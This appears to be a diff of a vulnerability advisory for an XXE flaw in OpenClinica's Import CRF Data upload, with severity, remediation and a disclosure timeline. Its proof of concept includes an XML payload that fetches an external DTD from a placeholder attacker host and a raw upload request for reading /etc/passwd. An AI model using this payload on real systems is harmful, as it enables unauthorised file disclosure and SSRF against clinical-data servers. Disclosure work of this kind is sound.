@@ -1,6 +1,6 @@
 # OpenClinica Import CRF Data – XXE file disclosure
 
-A stored/interactive XML External Entity in OpenClinica’s **Import CRF Data** allows disclosure of OS files via error-based XXE.
+An XML External Entity issue in **Import CRF Data** discloses OS files via error-based XXE.
 
 ---
 
@@ -13,15 +13,17 @@ A stored/interactive XML External Entity in OpenClinica’s **Import CRF Data** 
 `Tasks → Import CRF Data` (multipart upload parameter: `xml_file`)
 
 ## Auth
-Authenticated (tested as **Data Manager**; also reproducible with any role allowed to import CRFs)
+Authenticated (tested as **Data Manager** and **Clinical Research Coordinator**)
 
 ## Summary
-The XML parser behind the Import CRF Data workflow processes external entities. By submitting a crafted XML that references a local file via an external DTD, file contents (e.g. `/etc/passwd`) are reflected back in the **Alerts & Messages** pane. This confirms **XXE** with local file read and possible SSRF.
+The XML parser processes external entities. A crafted XML can read local files (e.g. `/etc/passwd`) and reflect their contents back in the UI error block, confirming **XXE** with file disclosure and potential SSRF.
+
+## Screenshot
+![Error-based XXE disclosing /etc/passwd](3.png)
 
 ## PoC
-Upload a tiny XML that pulls an external DTD which exfiltrates a local file via an error string.
 
-**evil.xml**
+**evil11.xml**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE xxe SYSTEM "http://ATTACKER/malicious.dtd">
@@ -35,8 +37,6 @@ Upload a tiny XML that pulls an external DTD which exfiltrates a local file via 
 %all;
 ```
 
-Or, embed a parameter entity directly if outbound HTTP is blocked and rely on error echo.
-
 ## Raw request (abridged)
 ```
 POST /OpenClinica/ImportCRFData?action=confirm HTTP/1.1
@@ -44,7 +44,7 @@ Host: <target>:8080
 Content-Type: multipart/form-data; boundary=----X
 
 ------X
-Content-Disposition: form-data; name="xml_file"; filename="evil.xml"
+Content-Disposition: form-data; name="xml_file"; filename="evil11.xml"
 Content-Type: application/xml
 
 <?xml version="1.0"?>
@@ -53,26 +53,20 @@ Content-Type: application/xml
 ------X--
 ```
 
-**Observed result**  
-Lines from `/etc/passwd` and other file content appear in the error block of the page (screenshots attached in the evidence bundle).
-
 ## Impact
-- Read arbitrary local files as the application user (secrets, config, keys).
-- Potential **SSRF** by pointing entities at internal HTTP services.
+- Read arbitrary local files as the application user (secrets, config, keys)
+- Potential SSRF by pointing entities at internal HTTP services
 
 ## Severity (suggested)
 **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **7.1 High**  
 **CWE:** 611 (XXE)
 
 ## Remediation
-- Disable DTD and external entity resolution on all XML parsers used here:
-  - `disallow-doctype-decl=true`
-  - `external-general-entities=false`
-  - `external-parameter-entities=false`
-  - `FEATURE_SECURE_PROCESSING=true`
+- Disable DTD/XXE on the XML parser: `disallow-doctype-decl=true`, `external-general-entities=false`, `external-parameter-entities=false`, `FEATURE_SECURE_PROCESSING=true`.
 - Validate uploaded XML against a strict schema server-side.
 - Minimise file permissions of the OpenClinica/Tomcat user.
 
 ## Timeline
-- **2025-10-09 → 2025-10-23**: Discovered and reproduced on 3.12.2 and 3.13 test images.  
-- Evidence: XML payload + UI screenshots included.
+- 2025-10-09: Discovered and reproduced on 3.12.2 and 3.13 images.
+- 2025-10-09: Attempted to contact vendor, no response.
+- 2025-10-23: Reported to VulDB.
